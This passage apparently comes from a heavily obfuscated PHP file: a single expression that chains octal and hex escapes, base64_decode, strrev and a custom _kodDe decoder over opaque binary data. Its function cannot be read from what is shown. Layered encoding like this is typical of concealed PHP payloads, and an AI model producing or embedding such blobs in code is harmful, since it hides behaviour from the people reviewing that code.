36\302\361\152"."\204\156\165\240\235\17\335\42\101\204\340\373\74\30\302\361\6\363\210\307\40\217\71\234\323\13\244\10\254\234\340\42\170\4\207\301\323\133\60\213\371\166\366\115\51\106\273\5\11\242\317\74\41"."\x66\x9a\xb6\x87\x31\xe3\x3c\x32\x57\xe\x7a\x11\x60\x1b\xb9\xec\x74\x96\x1f\xd\x99\x7f\x77\x27\x60\x3\xe0\xac\xd2\x59\xfa\x92\xc5\x2a\x5d\xf\x27\x43\x72\x35\x6d\x11\x98\xb1\x6b\xd9\x81\xec\x28\x43\x18\x83\x9c"."\34\306\23\56\102\113\5\46\301\3\150\322\340\331\221\66\53\207\371\16\312\71\167\222\170\373\21\57\176\202\370\166\363\206\334\157\201\370\243\350\206\27\227\76\147\153\275\354\133\30\233\362\373"._kodDe('K4xSJ5XGD5aGtDxdX0uHwUuwSy9mpRG9dHL0uOzz2MrAo9WGPNfLGyX+2sveUg8gsTNULPc6')."\363\202\320\241\235\305\7\104\34\141\215\246\14\233\215\31\162\66\34\15\36\147\14\357\52\37\71\52\310\263\172\234\263\67\43\241\246\204\162\172\24\341\125\303\124\151\35\25\27\126\310\77\146".base64_decode('TnG0zaZLqSf5Iq7lUjRlJTqDVtZXsI9UOKoL+HB2wsOiSinE4emWJwHDARm+ODdZUlQc00U=').strrev(')ã¸uÒ »”çQH[b¼KŒ)è‘à?‚„‰›]ñËõ"3ÂR•¥‰¥!9˜ƒn5N ').strrev('¶³À÷Ÿ¡ÌL( Qˆ½7‚õ Ši´ÚyóhˆÃYf»Bé7ö;‡f`n.F£r7j')."\37\131\22\145\41\370\260\150\160\344\334\314\72\336\104\112\7\6\15\111\105\304\4\301\76\207\15\321\247\25\304\134\63\354\204\121\4\37\203\205\213\210\250\124\54\255\15\11\312\312\121\107\302"."\61\226\75\312\172\57\7\235\215\322\150\243\207\374\266\240\316\313\273\231\257\136\21\365\234\25\242\250\11\241\212\10\232\53\364\103\6\222\60\75\370\21\2\375\320\343\235\111\67\220\102\154\133"."\x14\xb3\x8d\xf0\xa8\x81\xc3\x4b\x11\x7e\x0\xb8\xc2\x13\x5e\xc5\xf0\xb\x50\x41\xaa\xc4\xbb\xe0\xf8\xc9\x49\x26\xd0\x9e\x4\x38\xda\x47\x57\x8e\xc\x3a\xe5\xa\x3e\xbc\x85\x9a\xf1\x59\xc5\xe6\x84\x62\x3f\x19\x24"."\xe3\x3a\x1a\x27\x34\x2f\x5a\x88\x97\xe4\xc9\xa5\x5\xb\x12\x1f\x3\xe2\xd8\xe0\xf\x7b\x7c\x7\x8a\xf9\x15\xdb\xad\x57\x74\x8\x4f\xa7\x5a\xda\xf\xc\xc1\xe5\xe3\x4d\x5\x93\x53\xe5\xfc\xc4\x77\x17\xa\x92\xb"."\x30\x17\x52\x71\x9d\xd2\xd2\x7c\x38\x28\x8b\x92\x24\xa9\x8e\x9b\xc6\x70\xa5\xba\xa2\x98\xee\x28\x73\xe\x41\x37\xc9\x7b\x52\x81\x1e\x68\x3e\x74\x9d\x1\x59\x23\x4f\x8d\x44\x7e\x9\xf4\xb3\x9a\xbe\xe9\xc1\x1\xb8"."\xd6\xb5\xbe\xb6\x69\xa2\x3b\x72\xc1\x57\x40\x5f\x14\x1d\x91\x50\x1f\x20\x6\x22\x73\x12\xd7\xd2\xba\x4c\x34\x38\x32\x3\xf9\xbc\xe8\x36\x6f\xdf\x42\x55\x24\xf4\xee\xa4\x9a\x58\x9b\xf1\xbc\xc6\xb0\xba\xe2\x55\x5c".strrev('|¸‹+ºöqAD¼Éª·‚œl2”%˜Æ^œ"3JûÄ†-GKdğ(\'‘T“Àù\'&şYâ -').base64_decode('M60EbMRtyTPVUdJJgEDiNEIs+AS9VF5KK2nmAZYkycWsOaRLifjtMS9ypCjNlrJEo1IpvhQ=')."\244\107\150\147\246\10\225\55\146\201\224\205\272\204\233\100\67\277\17\137\112\174\62\212\17\24\12\14\364\351\60\361\273\70\112\224\223\60\346\214\263\175\133\356\40\244\215\207\206\204\134\42\155"."\xa\x7f\xd8\x47\x11\x7\x7e\x7c\x8d\xe6\xf8\x7e\x11\xe1\xd2\xa2\x32\xff\xb4\x7c\x43\x71\x21\x8f\xe0\x8c\x95\x2f\x1e\xc8\x64\x84\x4\x99\x3b\x3e\x61\x15\x8a\x30\xe4\x4a\x72\xca\x84\xd5\x9a\xc8\x5\x9e\xdd\x13\xcb"."\xa5\xf1\x9b\xd1\xc4\xd4\xbe\x5b\x8\xc0\x89\xe4\x27\x26\x86\x26\x40\x8f\x62\x19\xcb\xc7\xd1\xb9\x1e\xec\x33\x72\x3a\x63\x38\xa5\x8d\x82\x55\xe\xdb\xfd\x3f\xa6\xba\x4b\x67\x1e\xef\x90\x89\xc0\x5\xe7\x49\x9c\x76"."\x2c\x1f\x3d\xa4\xcb\xd7\x10\xce\x68\x16\xa8\x8a\x1f\xf8\x25\x64\xc\x90\x12\x52\x44\xb5\x1d\xd4\x58\x8c\xb4\x2f\x6d\x27\x7\x84\xa0\xed\x4b\xe7\x3\x1f\x76\xe1\xa8\xcf\x9a\x0\x66\xdd\xe5\xb8\xb8\xd\xc1\x89\x23"."\374\214\226\53\341\54\274\226\162\243\202\372\373\202\362\274\161\101\11\312\345\20\354\342\214\211\372\312\262\171\53\377\176\357\274\153\266\135\112\303\17\134\171\345\167\156\276\216\315\374\260\146\366"."\x0\xcf\x16\x2e\x40\x6b\xe\x44\xbf\x7\xd1\xb0\x90\x95\x5f\x7f\x82\x61\x7e\xf3\xa9\x7f\x5\x3f\x8\x6e\x7d\xe5\xeb\xc7\xcd\xbe\xb5\xea\xd2\xba\x57\x7e\xb7\xbe\xfa\xdb\xc7\x4c\xdd\xf4\x72\xec\x7b\x5b\x9e\xbc\xf0"."\317\177\363\374\144\374\335\347\12\103\113\247\174\355\234\332\337\237\372\334\306\343\252\337\76\240\370\233\233\147\237\271\355\53\277\177\145\377\63\247\264\254\373\354\272\267\237\336\275\357\335\347\176"."\xf8\xd0\xad\x57\x1c\xba\x2e\x3d\xfe\xc8\x5c\xf3\xf5\x4f\x5f\x9f\xf6\xf1\x9e\xe6\xe8\xeb\xab\xde\x7f\x69\xbf\x3f\x2f\x3a\xad\x7b\xde\x11\xdb\xa2\xf7\xad\xed\xd3\xe\x98\x3f\x7e\xf9\x87\xe3\x27\x3e\xbb\xf7\xe5\xb9"."\x73\x3d\x47\xec\x7f\xc3\xcb\x87\x77\x3d\xfa\x9f\xf6\x9a\x7b\xe2\xab\xd7\xbf\x79\xce\x1f\x26\xad\xab\xbf\xa8\x79\x4d\xf3\x5\xf5\x27\x9c\xf6\xc4\x91\x77\xee\xbd\xf7\xb1\x9b\x8f\xd9\xff\x80\x4d\x17\xa4\x2a\xaf\x39"."\251\370\315\203\352\256\176\342\303\357\36\130\274\255\363\257\47\165\374\350\206\263\177\267\335\172\354\256\277\136\233\277\366\137\33\136\277\153\277\205\317\352\233\24\153\351\57\27\176\370\337\273\76"._kodDe('L2tqMMJ7DsLM1uBdXtlux9TG68Zu6cgK1+rIPXarLsFtWlDdSWysxb3+w6KKbd6sQ7jsFepc')."\270\356\250\3\356\333\175\345\266\346\253\137\155\372\237\257\36\370\321\242\103\266\254\273\57\374\350\362\77\336\277\151\274\351\267\167\255\170\164\126\346\306\227\62\307\165\366\215\314\71\370\353\117"."\147\367\154\367\36\161\347\375\107\137\35\170\342\127\67\254\177\362\250\367\376\347\245\143\63\221\37\177\234\336\177\174\133\376\326\71\37\124\333\147\136\372\360\111\157\66\137\162\152\176\345\373\135".strrev('åxÿ‹Û³ú¾ô×ƒ¾ÒrÒœ†{+Æøkø>OgÔñx/ßÙû­×ã>n‡£Óó¾óøú=ç')._kodDe('KVoVbsRc8HNL52I0JuAwKJmS07GPbCS64Eav63BkFNcu08ID+KtuwlrUhm5P4MATxM1QeuQU')."\xbe\xf6\xfa\x51\xa7\xff\xf5\x60\x4f\xe1\x61\xdf\x93\xb3\x96\x5e\x7d\xcc\xa1\x9d\xdf\xbe\x7c\xfc\x84\x3\xe\x58\xfd\xe1\x51\x57\x1e\xf5\xc4\x65\xdf\xfe\xe9\x54\xdf\xbf\x1f\x53\xe\x58\xb2\xfd\xad\xfc\xf3\x73\x5a".base64_decode('R19cf9kp42+e2PR9+8r9rljoP+K98/926rZ7Nlxw4Pl/P/WGXYce+MF5f73i0sNfC+V/OpQ=').base64_decode('mTR1ZfvRV4cOvaX7oFNz1tzhm2pntsc+nbLrIkX5rWfkiZuPmpMZvnzDSb+8Y7Pn+DePPTU=')."\126\63\365\342\165\367\207\236\155\374\135\307\123\267\334\67\367\207\257\36\176\341\13\327\35\325\21\177\365\274\103\216\270\157\360\347\377\16\234\174\333\233\363\154\353\244\303\117\172\362\244\163\367"."\x3e\xbf\x71\xda\x59\x6b\x4f\x3a\xea\xc0\xfe\x5f\x2b\x97\xf8\x1a\x66\xb5\x4\x37\xfa\x2a\x4e\x9c\x76\xc0\xfc\x17\x7e\x7b\xee\xfa\x8b\x6f\xe9\x9a\x77\xc8\x45\x77\xde\xb2\xeb\xb0\x2d\x63\x37\x6d\x7e\xf6\x27\xca\xda".base64_decode('Y7s+OHf/Yy/eeuCcP1U3Dq7pf2zd0fe+/eT3a+8ZePXAySfc+ruhQ659etX/HFQ1dcYbFx4=')."\160\325\203\157\76\363\322\312\346\243\137\373\351\51\337\150\254\175\272\343\236\52\377\177\347\114\73\157\354\374\257\136\275\136\235\173\351\117\77\350\75\252\356\341\372\237\371\326\174\360\152\357\351".base64_decode('b4dv0jMXHHDhz0/9wYvh2lsqtu7X+JW6/m+/3dP9zw3Xf2+p/52/xszoPet+1vv1Ox+8/U4=')."\353\244\376\333\216\133\163\344\207\77\375\312\151\47\265\104\46\77\372\215\151\165\53\257\275\253\277\346\301\370\37\316\255\357\174\261\357\210\137\127\177\147\137\342\40\353\316\302\162\363\355\333\232".base64_decode('bine/HLnSUOx137z0Pal5qPa5D8dscPoubn/kNitjR+c3tg9knr/wg0/OG7S4w/effrAtqM=')."\156\272\265\176\353\214\300\231\253\332\266\15\376\74\325\263\361\343\7\7\46\175\357\310\365\357\77\321\171\315\224\53\136\112\370\336\371\313\235\137\265\236\172\74\367\322\143\257\137\364\253\157\7"._kodDe('KgGj6FFz32aR1OVrLcDj5zK+78NX5/JrwWXSr3Ce246eAxHv4Zjn/x0P4hus4uzrV5/wL+83')."\312\127\16\311\177\375\340\173\77\257\237\62\130\331\171\332\103\157\154\271\253\153\347\322\175\363\277\176\313\57\36\137\377\115\377\65\47\37\64\355\262\320\37\276\357\371\170\303\211\137\73\177\347"."\x5f\xe\x9d\x74\xc6\x5c\x65\xf2\xd5\xf\x7b\xaf\x3e\xe4\x81\xea\x67\x36\x1c\xff\xce\x13\x47\x1c\xfe\xd9\xcd\x2b\xef\xbf\xb2\x7b\xd9\xd5\xc9\xe7\xae\xb8\xf1\xc8\x33\xbf\xf6\xe9\xae\xdf\xbf\xf8\xbb\xae\xa6\x6d\x5f"."\271\140\215\271\363\345\201\167\136\353\337\376\373\355\103\353\17\12\376\351\301\173\233\136\272\356\314\55\267\135\164\326\353\323\147\137\367\142\323\214\133\77\74\353\370\365\353\357\172\266\351\225\375"."\xf6\x1d\x75\xd1\xb6\x4d\xbb\x7e\x7c\x5e\xf1\x3f\xe9\xb3\x5f\x3b\x6d\xde\x51\x77\xfd\x60\xe1\x83\x6b\x57\xae\xdb\xf4\xdf\x91\x79\x9b\x2e\x59\x7f\xc0\x31\x59\xab\xfa\xeb\x9f\x5f\xfc\xa7\xa7\x5e\xdc\x13\x7f\x27\xf6"."\341\163\337\132\364\353\131\117\154\274\362\223\113\267\165\366\274\160\300\256\313\56\271\151\263\176\336\254\17\336\275\151\315\343\17\26\257\273\361\275\327\147\75\373\311\52\55\71\152\214\275\364\333"."\355\273\322\247\305\264\205\277\173\167\362\320\361\273\317\36\372\307\355\152\327\43\37\375\341\305\167\156\277\352\234\321\217\136\373\340\370\145\73\325\335\303\377\372\350\356\17\256\372\174\341\347\373"."\x7e\xfe\xf3\xbd\xe7\x3c\xb2\xe6\xbf\x6f\xbf\x7f\xe4\xee\xad\xb7\x1c\xfb\xd9\xea\xa7\xbf\x71\xce\xdf\x5f\x58\xb4\xe2\xd3\x15\xbf\x3d\x7b\xd5\xbb\xaf\x5e\xbe\xe9\xce\xef\x1e\xfb\x8f\x4b\x8b\x93\xf5\xc1\x45\x77\x6d".base64_decode('OO/SHcc0zVv9yw2nVj52z48u+PvkfWfO/PfRNU3aPm8oMu2Hn46f1Zt89ahjP/7q9w+2pj4=').base64_decode('vmbW7QfG22+acknnn/a1PHBkx/uJ416bvf0fP332oSXTtyzN+d/5+daqh/77xEe33HbF2Hc=')."\76\275\166\151\365\231\343\177\261\127\377\146\355\123\57\157\234\341\35\275\74\265\367\41\155\353\77\217\113\356\271\352\224\216\371\247\175\164\312\374\375\32\277\177\164\340\206\137\34\352\235\361\215".base64_decode('V9e/8uHWv86cefDNx08KHH1o5bFDM3Onb51zYvO9P1j9yKu/urr/vL1awwurHn/lva2bD7w=')."\176\321\364\272\115\321\304\272\363\237\370\305\340\33\377\176\247\355\331\234\367\251\263\317\376\323\237\323\107\25\276\376\13\357\337\276\366\100\341\311\37\274\171\321\226\223\57\173\353\314\266\201\203"."\76\275\40\360\267\53\356\72\262\377\323\117\173\16\156\173\276\355\376\155\361\277\105\76\130\260\375\323\373\266\257\173\341\144\363\77\47\156\57\334\176\345\51\263\355\313\157\251\374\317\113\63\236"."\x1b\x99\xf1\xad\xe1\xe1\xbb\xeb\x5f\xbb\xfb\xa5\x69\x87\xa6\x9f\xbc\x6e\xfe\xf0\x39\x66\xf2\xc7\x3\xbf\xc9\x6d\xdc\x7d\xdf\x5a\x4b\x1f\xbd\x73\xf9\x9d\x17\xa4\xa3\x77\xd6\x4c\x9b\xfe\x97\xe0\xfc\x5b\x6b\x8e\x18"."\x6c\x4e\xdd\xf8\x93\x4f\x1e\x7b\x72\xea\x2f\xc7\x9f\x8c\xcc\x5b\xf9\xc9\x9e\x83\xef\x9e\xfc\xec\x19\xca\xbb\x2f\xdf\xbd\xe5\xf1\xea\xbf\x1f\xde\xb3\x3a\x31\x94\x7b\xf9\xd0\xa3\x9f\x79\x6f\xd3\xd9\xd5\xaf\x3c\xf2"."\xd4\xf1\x93\xc3\x1f\x4e\x3e\xe6\xec\xc1\x6f\xdd\xf7\x9c\x7f\x7b\xed\xdf\xab\x95\xb1\xef\x1d\xfa\xea\xa4\x8f\xe7\x4c\xde\x78\xee\x77\xff\x78\xdf\x23\xaf\xed\xf7\xf4\x5\xbf\xec\xb1\x16\x5f\xd7\x76\xe8\xa2\xaf\x54".base64_decode('fPxRoLDG7LnrsDv+cuTQN+6edMlBF99Y1xxedcx/5qUO2Hn5009Muv/2BzoPSz1xXeafF0U=')."\x8f\x7b\xe8\xc0\x63\xef\x4f\xb5\xfe\x74\xc3\x93\x8b\x56\x7c\xf5\xbc\x7f\xf6\xee\x38\xfa\xb2\x13\x7f\x73\x7c\xc7\x87\xd5\x53\x4e\x58\x7d\xf6\x33\xf7\x5e\xbe\x75\xde\xef\x7f\xdc\x95\x7a\xc8\xba\xe6\xfa\x4f\x36\x36"."\x9f\x78\xe5\xb7\xb5\x9b\x1b\x7f\x77\x97\x77\xc5\xcd\xdf\x8\xbc\x76\xe1\xf7\x6e\x5d\x94\x7f\xf1\xf3\xaf\x7c\x7d\xf7\x63\x7f\x4e\xb4\x75\xe4\xdf\x9e\xdc\x54\xb5\xe1\xd7\x99\xe5\x63\x91\xef\x2a\xad\xfa\x9\xf9\xfd".base64_decode('r/3vAzfqJ+/Izai/ufq59vtSU775xg3Xn3jLv3712UsvpQfr216ZsfIn/i7/xyNnjW/x3H4=')."\301\373\3\167\207\237\375\343\333\146\342\242\326\253\256\375\311\247\37\355\371\54\367\267\37\4\57\74\162\335\266\315\133\266\14\37\374\37\353\365\203\237\376\103\347\123\37\177\174\333\277\117\150".strrev('Èyš7æ{¯»-æŠìuÿŸş‰[÷ê_nßóë@ĞğÜ½ëÉäú^yÏÉèÉıç|´İ')."\3\263\137\250\77\364\27\7\50\265\153\256\114\265\376\151\140\311\264\247\137\236\243\316\51\334\171\377\362\313\366\356\150\274\360\276\53\177\171\333\305\17\117\335\360\227\213\117\150\255\33\355\330"."\170\320\66\145\351\77\66\77\274\343\365\77\34\367\316\225\17\116\36\315\116\77\143\112\366\214\256\245\77\157\155\322\146\345\156\357\277\65\63\357\252\347\77\37\374\307\273\167\137\370\306\332\301"."\177\215\355\174\156\361\147\343\237\354\336\135\377\371\236\27\236\211\336\320\375\311\77\324\67\36\371\360\335\117\136\275\112\73\147\367\252\217\76\171\377\215\67\66\354\176\343\263\377\276\377\342\63"."\xcf\x3c\xbf\xa8\xee\xf3\x5f\xbd\xf7\xfc\xe2\x4f\x3f\x7c\xff\xba\xdd\xea\xa7\x7b\x3f\xf8\x7c\xed\xa7\x5f\x79\xef\xc3\x9b\x7f\xb3\xfb\xf9\x53\xaf\xf7\x1d\x34\x7e\xd1\xe6\x75\x8b\xe\xbf\xee\xad\xcd\xb\xe6\xbe\xfe".base64_decode('513Drx8/543qZXf96LVHPvos8Jd7Xu0ffvDM9/Z9uOf1Tw/ZZl796xO/+tenTtmz65VvHns=').strrev('Ìÿ{æ9>;·ø^§ì[	À…óôZ§ükÅæ=×Ög¶|9ŸeÉ“?ƒp?»Öö_·Áã')."\x5e\xf3\xcd\x8d\x7\x5f\xf3\x8b\x37\xf\x7d\x6d\xd7\x35\xd7\xd5\xfc\xf1\xf3\x93\xf3\xcf\x9e\xff\xd3\xc3\xbf\xc6\xb4\xfe\x8a\x3\xbd\x9a\x99\x4\xd6\x12\xc8\x2e\xcd\x99\x9\x12\x5e\x49\x2d\x6b\xf6\xd\xc3\xcb\xdb"."\xec\x5a\x48\x9d\x3f\x1f\x24\x3c\x8b\xa3\x46\x6f\xb6\xaf\x9f\x46\x66\xb2\xcc\xf9\x10\xa8\x99\xc7\x52\xa0\xf1\xf9\x40\x84\xf5\xf5\x17\x87\x57\xf5\x2\x11\x5c\x5b\x3\xa9\x85\xe1\xa4\xb5\x4a\x83\x7b\xe4\xbc\x19\xac"."\xb9\x39\xc0\xf6\xeb\x37\x6\x7a\xfb\x7a\x80\x5e\x1e\xee\xb7\xf5\xc\x7b\x81\x9f\x33\x1b\x3e\x30\x6b\x26\x94\x4d\xe6\xec\xbe\xe2\x30\x5c\x42\x20\x6d\x7e\x2d\x74\x7a\xc6\x5c\xf8\x9d\x9\x9f\x30\x6\xb2\x83\xfd\xec"."\115\73\253\27\173\206\231\350\126\321\112\16\153\114\233\145\376\74\370\114\146\260\177\244\167\24\130\55\303\51\73\223\317\2\221\331\223\351\57\364\216\0\353\170\76\353\326\174\66\356\71\163\241"."\x2f\xb3\x20\x47\xcb\x67\x7a\x47\x87\x81\x9c\x1f\x1a\x4e\x8f\xac\xb2\x99\xe4\x60\xba\x90\x2c\xda\x30\xb3\xab\x46\xa\xa3\xfd\x4c\x64\x20\xd9\x9b\xd7\x6\x18\xa3\x27\x9d\x4f\xd\xd\xf7\x41\x9d\xe2\xa0\x66\xe\xb3"."\333\312\154\66\353\366\100\162\164\70\17\55\315\251\205\65\231\123\3\203\327\54\175\40\237\201\25\316\256\352\323\13\51\326\377\231\265\254\51\266\240\220\60\153\66\264\142\244\164\273\60\2\155"."\47\107\126\15\350\114\342\146\306\34\30\363\140\157\321\354\113\301\374\130\243\271\241\336\141\220\221\350\327\106\123\303\114\6\147\336\134\130\235\271\63\340\361\263\247\220\356\35\352\203\101\317\143"."\x9f\x9e\x7\x5f\xce\xf7\xae\x1a\x2a\xa4\xa1\xf2\xcc\xd9\x50\xc7\x1a\x18\x1d\xea\x19\x81\xf9\x9c\x39\x17\x16\x5a\x4b\x27\x47\xb9\x6a\xdd\xdc\xb9\x0\xc4\x33\x67\xb1\xd1\x41\x4f\x67\x32\x90\x1b\x49\xa6\xac\xbe\x7e".base64_decode('YKPmh9J6ZhD6zzbAbAY6tbXQytw50P+BtNGbLLBLR00NA302l2wyB4dGsz0DAM6zGZCbes4=')."\x18\x1d\x5a\x45\x23\x29\x4\x7e\x83\xfd\x20\xb5\x30\x67\x1e\x74\x73\x68\xa0\x58\xc8\xf\x2\xbf\x7b\x50\xef\x1d\x1a\x60\x52\x1f\x66\x4f\x71\x60\xa4\xf\x66\x57\xcb\xe5\x53\xfd\x3\x6c\xb\xd4\xce\x60\x9b\x0\xe6"."\157\66\333\165\105\103\33\356\263\206\30\240\365\133\205\54\314\371\374\131\120\44\155\217\14\30\75\260\312\131\173\264\327\320\330\23\336\150\332\36\264\240\207\265\263\140\260\175\3\43\346\160\77"."\x6c\x6f\x23\xd9\x9b\x4e\x31\xf0\x9b\x55\xb\xd3\x50\xe8\xcd\xea\x83\x6\x53\xb8\x4b\x1b\xa3\x36\x93\xad\xd1\x87\xec\xc1\x34\x7b\x2c\x9c\x37\x8f\x6f\x18\x98\x67\xb3\x30\x9a\x43\x68\x80\x81\x48\x71\xa0\xaf\x1f\x66".base64_decode('q2gOWoVhGEgmrekDOcjJmcnBdA97f8z26KlBwDL9meGhvA6RgpmyelbZDCvBRM0UXahhgwA=')."\50\310\45\63\243\253\106\340\213\71\155\40\325\307\364\45\346\316\7\320\233\67\23\2\275\326\10\302\44\60\15\251\302\140\326\130\5\113\330\240\45\7\30\17\231\113\127\313\102\313\5\335\52".base64_decode('ZmzKcZMfXZhiqJHzZbUclxxqgeWQ02gTAKC6zvQJYBptIY8CstOQbmR1wSOnLxGspri5Y7Y=').base64_decode('iSTRgqNxuRWEi6VsFHPkxmWVBxgp7qFPnoEVWbb9yzx4AnNXfs0aMFPJjFlMOVpN9fjKzCo=').base64_decode('HUm5nLQ7nUtA9UgrJhp3yPKzNMcM0nogfdOs20qqh2qCW0xmimap5A8Mj2pFW1jQnivysWc=')."\63\247\250\11\155\336\307\126\225\276\15\330\232\65\340\223\73\354\225\163\215\34\32\140\46\343\163\152\314\143\325\365\216\166\65\21\210\57\221\344\36\261\152\265\343\363\45\203\25\253\54\115\271"."\274\330\316\211\141\300\264\157\347\103\143\133\256\34\277\342\236\361\315\73\306\36\274\154\337\216\173\306\36\271\2\105\367\354\272\170\154\307\15\157\135\263\176\317\256\315\173\166\235\273\157\343\375"."\357\75\174\321\330\226\235\373\276\363\310\330\326\73\306\156\335\270\347\241\107\366\355\336\270\367\216\13\367\354\332\76\276\365\202\261\365\17\354\171\350\312\261\357\156\33\333\270\145\374\262\315\173"."\x1e\xd9\x8a\xca\x8f\x7f\x57\xb4\x8c\x8a\x8d\x6d\xbf\x1a\xd7\x7d\x78\xdd\xd8\xae\x5d\xfb\x6e\xba\x83\xe7\xbe\xf7\xf0\x79\x80\x1\xfb\xc4\xf2\xc4\xcf\x88\xb0\x85\x21\x10\xac\x2c\x52\x0\x76\x75\xcb\xa7\xb4\x67\x74".base64_decode('NGMKkdHBkm82OjoVm0jAaehvzsx5KWyyNTZyOFthc+3j8JvQs3kMhTBLfqr6K9RGgoQnqfQ=')."\150\3\12\345\374\323\136\371\204\272\72\321\61\265\204\341\6\17\353\26\146\316\53\171\275\220\65\54\54\3\255\230\151\254\346\244\340\247\4\6\155\316\215\120\156\21\151\106\31\120\306\53\51"."\40\241\12\7\253\235\175\122\60\157\122\111\153\50\230\252\123\322\250\76\173\224\351\126\154\223\205\263\243\34\266\330\274\223\71\203\141\321\321\226\335\266\145\241\213\367\227\101\130\57\177\102\20"."\234\155\30\201\244\226\104\237\217\112\40\233\340\1\47\22\163\140\10\47\372\223\263\234\123\6\254\147\42\133\341\121\150\127\74\144\45\74\212\123\325\36\313\112\60\371\3\74\26\261\256\76\205"."\346\203\374\16\255\136\127\72\270\202\236\317\360\167\264\240\231\37\245\213\1\300\54\57\203\153\220\361\62\23\312\207\351\310\104\210\243\150\227\51\50\317\273\314\364\66\314\140\6\41\151\361\332"."\113\344\36\104\227\151\124\60\333\165\113\10\355\27\364\224\301\4\305\365\54\51\11\270\335\47\75\165\121\135\64\56\255\236\104\373\263\340\170\305\133\270\70\337\227\307\23\151\57\130\14\152\37"."\114\137\121\352\3\204\205\332\235\234\232\161\277\14\362\335\334\330\40\331\27\301\305\352\274\136\257\304\301\26\122\171\70\244\262\201\21\375\251\170\137\321\306\302\47\315\31\263\207\1\222\170\166"."\x47\xc5\x43\x78\xe1\x26\x4a\x6f\xe4\xc2\x2a\x8\x3d\xf5\xf6\xa2\xf6\xea\x88\x9e\xb3\x32\x5d\x41\x63\x98\xe7\xab\x45\x1\xb2\xc3\x66\xfb\xe6\xa2\x20\x99\x4c\xd8\x4d\x5d\x30\xc1\x45\x8b\xe9\x92\x4d\xf5\xcd\x82\xeb"."\216\265\0\20\304\2\2\66\365\322\310\40\135\324\52\346\62\54\25\5\121\221\130\61\207\1\241\316\71\35\172\56\45\125\132\240\45\155\251\125\65\15\363\355\23\123\245\115\27\371\172\12\324"."\65\375\322\4\16\103\1\126\267\325\11\36\150\374\136\16\61\150\345\321\151\231\242\150\22\116\76\150\322\222\114\102\304\4\260\341\352\144\272\276\240\252\55\103\103\36\235\310\71\56\222\154\145"."\64\366\370\152\141\55\237\234\316\101\263\150\311\232\30\272\330\377\130\230\137\105\304\213\45\200\132\115\31\120\64\22\156\120\33\303\61\121\117\315\27\335\2\247\262\261\236\100\173\130\215\307\243"."\222\370\51\250\71\55\211\66\252\301\150\164\111\30\340\265\116\302\300\130\301\125\274\322\343\230\120\164\305\17\126\262\0\237\114\164\141\63\52\230\132\210\53\40\211\213\166\104\260\45\20\343\232".base64_decode('ELN9Nb5aURZ9UMVqH/XMNkM8EYiVMaZDjezA2oBhHajQEl2mBKORjta2OLUhQ9PbolI+kXc=')."\207\154\146\152\247\64\33\232\17\265\107\2\301\220\22\156\113\104\231\332\12\27\64\46\12\113\161\36\147\123\120\260\164\156\112\7\352\323\210\254\124\45\267\310\133\2\150\356\364\124\166\125\164"."\115\353\252\352\252\136\351\353\262\272\375\322\231\150\310\313\3\221\366\106\30\136\35\17\245\54\330\307\255\161\164\166\322\140\64\26\10\106\130\127\32\2\161\10\106\203\141\32\330\173\371\17\367"."\74\170\361\336\353\166\214\135\260\31\65\64\176\355\272\361\253\36\100\224\26\246\256\166\134\264\367\321\213\307\57\337\71\176\21\120\105\312\276\235\77\336\363\310\356\275\227\337\61\266\343\352\361"."\x2b\x7f\xb2\xf7\xda\xf3\x69\xc6\x5b\x77\xfe\x70\x6c\xd3\x1d\xbc\x63\xca\x5b\x97\x3d\x3a\x7e\xf1\x6d\x9c\xe2\xa2\x84\x96\x7\xd5\x7e\x6b\xfd\xe6\xbd\x8f\xec\xc0\xf4\xd6\x2d\xe7\x8e\xff\xe8\xc2\xf1\xad\x9b\xc7\x36"."\335\64\166\315\35\173\57\336\71\166\363\167\306\66\154\336\267\363\212\311\156\100\242\361\116\266\24\240\162\357\77\13\233\113\240\323\333\145\115\307\123\133\215\176\253\260\176\14\372\145\142\376\104"."\xe0\xfb\x8c\x8e\x50\x5b\x30\xe4\xd6\x2a\x93\xa3\x60\x87\x68\x1a\x85\x10\x2a\x43\x4\xc4\xb6\x5\x76\x8c\x58\x9c\xd8\x2d\xa9\xaf\x9c\xb0\x17\x6b\x60\xfd\xa5\x4e\x49\x9d\x69\xc\xc5\x83\xb1\x70\x43\x8\x34\x30\xf8".base64_decode('Qk0lpA6IgaDUeGwpD3Ml5BK7UUoVA+ZqxTEQzZc0M8VsjnRWqcACbRUefEoRFTelAp+4KEE=')."\xc7\x46\x16\xaa\xb0\x55\x19\x22\x16\x5d\xb9\xa2\xd2\x53\xe3\xa9\xad\x56\xc0\xa8\x14\xad\x1\xa6\xa4\x94\xa\x10\xff\xe7\xf5\x1c\x1f\xf1\xf4\x38\x62\xb5\x9e\x9a\x6a\xa5\x22\x3f\x50\x1\xfd\x12\xf3\x8a\x7a\xaf\xd2".base64_decode('kpaieaqgw3J3RVmExiy7oBkIrylJD0/i9dGvwzxU0idq0HVCJdxpSqCt0VmSWpVqryTCqUk=').strrev('Ñ5•‹WJœ*Y*ABØ³Kv‘sT(­*›×ÌŞÑ<MTdÇzŒ˜æ©&L¥¯@zV¬®e°ÓÍÍŸ')."\x30\xd0\xe2\xd0\xf2\x28\xc0\x73\xb0\x52\x7\x6f\x9\xa1\x23\x9e\xc1\x56\x10\xa7\xf3\x45\x2c\x93\x47\xcc\x7d\x55\x50\xca\x90\x8e\x33\x6b\xf5\x32\x54\x7\xb6\x13\x5a\x57\xf0\x31\x30\x58\xe6\x2\x5a\xdc\x58\x18\xd6"."\xc1\xc\x25\x82\x2d\x14\xca\xe3\x12\x98\xa7\x7a\xa6\x3a\x0\x55\x4c\xa7\xe2\x0\x11\x7e\xf\x82\x72\x74\xbb\x60\x84\x30\x89\x94\xb\xb7\x61\x5\x5d\xaa\x7b\x18\xf\xb6\x84\x5a\x3\x3e\x40\xe2\x14\x12\x68\x79\x4c"."\x8b\x29\xf5\x4a\x25\xc6\x7c\x34\xa9\xd2\x31\xfd\xe4\x43\x6c\xca\x12\xe4\xab\x68\x5f\xa9\x36\xa2\x9e\xe8\x2c\xe4\x7b\xa1\x33\xb0\xfa\xa\x31\x2\xa1\x91\x2a\xf5\x95\xd4\x6c\xf\x34\xc9\xad\xda\x45\x63\x9\x15\x4d"."\x0\xa0\x67\x9\xeb\x56\x4a\xa7\x85\x24\x42\x8f\x95\xeb\x86\x18\xc1\x97\x46\xe4\x90\xc9\xc\x10\xa5\x7a\x98\xf1\x3b\xd4\x38\x6e\x33\x18\x6d\x6b\xa\x33\x35\xcb\x46\xb8\xe2\xe7\x53\xa6\xa3\x50\x63\x2c\x8c\xad\xb2"."\300\367\25\326\224\244\3